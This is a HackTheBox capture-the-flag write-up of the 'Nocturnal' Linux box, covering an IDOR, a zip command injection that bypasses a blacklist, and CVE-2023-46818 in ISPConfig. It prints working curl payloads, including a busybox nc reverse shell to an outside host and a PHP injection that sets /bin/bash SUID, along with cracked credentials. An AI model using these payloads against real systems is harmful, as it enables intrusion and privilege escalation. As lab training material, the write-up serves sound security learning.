---
tags:
  - ctf
  - hbwj
platform: htb
os: linux
---
# Nocturnal - HackTheBox Write-up

# HTB Nocturnal

**Box**: Nocturnal
**OS**: Linux (Ubuntu)

## Executive Summary

Nocturnal is a easy-difficulty Linux box featuring a custom file upload application with an IDOR vulnerability, command injection through a backup feature, and privilege escalation via CVE-2023-46818 in ISPConfig. The box teaches valuable lessons about input validation bypasses, password reuse, and the importance of thorough enumeration.

## Enumeration

### Initial Port Scan

Starting with a comprehensive nmap scan:

```bash
nmap -sC -sV -oA nmap/initial 10.10.11.64
```

Results showed:

- **Port 22**: OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
- **Port 80**: nginx 1.18.0

A full port scan (`-p-`) didn't reveal any additional open ports, though later we discovered port 8080 running on localhost.

### Web Enumeration (Port 80)

Browsing to `http://10.10.11.64` redirected to `http://nocturnal.htb`, so I added this to `/etc/hosts`:

```bash
echo "10.10.11.64 nocturnal.htb" >> /etc/hosts
```

The website presented a simple file upload application with login/register functionality. I created a test account:

- Username: `test123`
- Password: `test123`

After logging in, I discovered:

- File upload functionality (allowed extensions: pdf, doc, docx, xls, xlsx, odt)
- Uploaded files viewable at `/view.php?username=test123&file=filename`
- User profile page showing uploaded files

### IDOR Vulnerability Discovery

The URL structure immediately caught my attention:

```text
http://nocturnal.htb/view.php?username=test123&file=test.pdf
```

Testing for IDOR by changing the username parameter:

```bash
curl http://nocturnal.htb/view.php?username=amanda&file=
```

This revealed amanda's uploaded files! I found `privacy.odt` and downloaded it:

```bash
curl -o privacy.odt "http://nocturnal.htb/view.php?username=amanda&file=privacy.odt"
```

Extracting the ODT file (which is essentially a zip archive):

```bash
unzip privacy.odt
cat content.xml | grep -i password
```

This revealed credentials: **amanda:arHkG7HAI68X8s1J**

## Initial Foothold

### Admin Panel Access

Logging in as amanda revealed she had admin privileges. The admin panel at `/admin.php` provided:

1. Source code viewing functionality
2. Backup creation with password protection

I immediately created a backup to analyze the source code:

```bash
curl -X POST http://nocturnal.htb/admin.php \
  -b "PHPSESSID=ij6e6ppr3guk3ven755kjp72no" \
  -d "password=test123&backup=Create+Backup"
```

Downloaded and extracted the backup:

```bash
unzip -P test123 backup_2025-01-31_*.zip
```

### Command Injection Vulnerability

Analyzing `admin.php`, I found a critical vulnerability at line 221:

```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```

The password parameter wasn't properly sanitized. However, there was a blacklist:

```php
$blacklist = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
```

Key observation: newlines (`\n`) and tabs (`\t`) weren't blacklisted!

### Exploiting the Command Injection

After extensive testing, I discovered that zip's `-T` (test) and `-TT` (custom test command) flags could be abused:

```bash
# Working payload structure
password=test123\n-T\n-TT\n/bin/sh\t-c\t"COMMAND"
```

Testing command execution:

```bash
curl -X POST http://nocturnal.htb/admin.php \
  -b "PHPSESSID=ij6e6ppr3guk3ven755kjp72no" \
  --data-urlencode $'password=test123\n-T\n-TT\n/bin/sh\t-c\tid' \
  --data "backup=Create+Backup"
```

This confirmed execution as `www-data`. I then established a reverse shell:

```bash
# Listener
nc -lvnp 9999

# Payload
curl -X POST http://nocturnal.htb/admin.php \
  -b "PHPSESSID=ij6e6ppr3guk3ven755kjp72no" \
  --data-urlencode $'password=test123\n-T\n-TT\n/bin/sh\t-c\tbusybox\tnc\t10.10.14.2\t9999\t-e\t/bin/sh' \
  --data "backup=Create+Backup"
```

## Lateral Movement

### Database Discovery

As www-data, I found an SQLite database:

```bash
find / -name "*.db" 2>/dev/null
# Found: /var/www/nocturnal_database/nocturnal_database.db
```

Extracting user hashes:

```sql
sqlite3 /var/www/nocturnal_database/nocturnal_database.db
.tables
SELECT * FROM users;
```

Users and their MD5 hashes:

- admin: d725aeba143f575736b07e045d8ceebb
- amanda: df8b20aa0c935023f99ea58358fb63c4 (already cracked)
- tobias: 55c82b1ccd55ab219b3b109b07d5061d
- kavi: f38cde1654b39fea2bd4f72f1ae4cdda

### Password Cracking

Using hashcat to crack tobias's hash:

```bash
echo "55c82b1ccd55ab219b3b109b07d5061d" > tobias.hash
hashcat -m 0 -a 0 tobias.hash /usr/share/wordlists/rockyou.txt
```

Result: **tobias:slowmotionapocalypse**

Successfully switched to tobias:

```bash
su tobias
# Password: slowmotionapocalypse
cat /home/tobias/user.txt
```

**User Flag**: `b5cfcabe23258016eef6c36b8a715c02`

## Privilege Escalation

### Enumeration as Tobias

Standard enumeration revealed:

- No sudo privileges
- No interesting SUID binaries
- A systemd service file: `/etc/systemd/system/ispconfig.service`

```bash
cat /etc/systemd/system/ispconfig.service
```

This showed a PHP development server running as **root** on port 8080:

```text
ExecStart=/usr/bin/php -S 127.0.0.1:8080 -t /var/www/ispconfig/
```

### Port Forwarding

Since port 8080 was only accessible locally, I set up SSH port forwarding:

```bash
ssh tobias@10.10.11.64 -L 8080:localhost:8080
```

Browsing to `http://localhost:8080` revealed ISPConfig 3.2.

### ISPConfig Exploitation (CVE-2023-46818)

Testing password reuse, I successfully logged in with:

- Username: `admin`
- Password: `slowmotionapocalypse` (tobias's password)

Research revealed CVE-2023-46818 - a PHP code injection vulnerability in ISPConfig's language file editor. The vulnerability occurs when editing language files through the admin panel.

The key insight was using a backslash in the parameter name to bypass sanitization:

```text
records[\]
```

Exploitation steps:

1. Navigate to System → Interface → Languages
2. Select any language file (e.g., en.lng)
3. In the request, modify the parameter from `records[key]` to `records[\]`
4. Inject PHP code as the value

Working payload:

```bash
curl -X POST http://localhost:8080/admin/language_edit.php \
  -b "PHPSESSID=stored_session" \
  -d "records[\]='];system('chmod u+s /bin/bash');die;#" \
  -d "id=1&lng_file=en.lng"
```

This made `/bin/bash` SUID, allowing root access:

```bash
/bin/bash -p
whoami
# root
cat /root/root.txt
```

**Root Flag**: `e6813c3556343f46eeef01c0f5dfecdf`

## Red Herrings and Dead Ends

### Failed Privilege Escalation Attempts

1. **Kernel Exploits**: The kernel version (5.4.0-200-generic) wasn't vulnerable to common exploits
2. **Cron Jobs**: No exploitable cron jobs found
3. **Docker**: Initial enumeration suggested Docker might be present, but this was a false lead
4. **File Upload to RCE**: Attempted various file upload bypasses for PHP execution, but nginx configuration prevented this
5. **SSH Key Reuse**: Amanda's credentials didn't work for SSH, only for the web application

### Lessons Learned

1. **Character Blacklist Bypasses**: Always test alternative characters like newlines and tabs when spaces are blocked
2. **Password Reuse**: Always test discovered passwords across all services
3. **Local Services**: Don't forget to check for services listening on localhost
4. **Parameter Manipulation**: Sometimes adding special characters (like backslashes) to parameter names can bypass security controls

## Conclusion

Nocturnal was an excellent box that demonstrated real-world vulnerabilities:

- IDOR leading to information disclosure
- Command injection through insufficient input validation
- Password reuse across services
- CVE exploitation in a real application

The box required patience and thorough enumeration, especially when discovering the ISPConfig service running locally. The command injection bypass using newlines and tabs was particularly clever and educational.

## Tools Used

- nmap
- curl
- hashcat
- sqlite3
- busybox nc
- SSH port forwarding
- tmux (for session management)

## References

- [CVE-2023-46818 - ISPConfig PHP Code Injection](https://nvd.nist.gov/vuln/detail/CVE-2023-46818)
- [Zip Command Line Options](https://linux.die.net/man/1/zip)
- [IDOR Prevention - OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)